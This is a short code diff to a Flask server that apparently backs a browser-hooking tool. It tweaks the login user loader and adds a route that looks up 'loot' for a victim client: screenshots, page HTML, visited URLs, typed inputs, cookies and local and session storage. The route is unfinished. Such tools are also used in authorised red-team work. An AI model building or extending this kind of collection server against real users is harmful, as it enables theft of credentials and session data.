@@ -290,7 +290,8 @@ def clientSeen(identifier):
 # Needed by flask-login
 @login_manager.user_loader
 def user_loader(username):
-    return User.query.get(username)
+    # return User.query.get(username)
+    return User.query.filter_by(username=username).first()
 
 
 # Need an admin account
@@ -607,6 +608,26 @@ def getClients():
 def getClientDetails(id):
     print("** Got client details request for client " + id)
 
+
+    # Let's find all our loot in the database
+    client = Client.query.filter_by(id=id).first()
+
+    clientName = client.nickname;
+
+    print("Digging up look for client: " + clientName)
+
+    screenshots    = Screenshot.query.filter_by(clientID=clientName)
+    htmlCode       = HtmlCode.query.filter_by(clientID=clientName)
+    urlsVisited    = UrlVisited.query.filter_by(clientID=clientName)
+    userInputs     = UserInput.query.filter_by(clientID=clientName)
+    cookies        = Cookie.query.filter_by(clientID=clientName)
+    localStorage   = LocalStorage.query.filter_by(clientID=clientName)
+    sessionStorage = SessionStorage.query.filter_by(clientID=clientName)
+
+    
+
+
+    # client = Client.query.filter_by(nickname=identifier).first()
 
     return "ok", 200
 
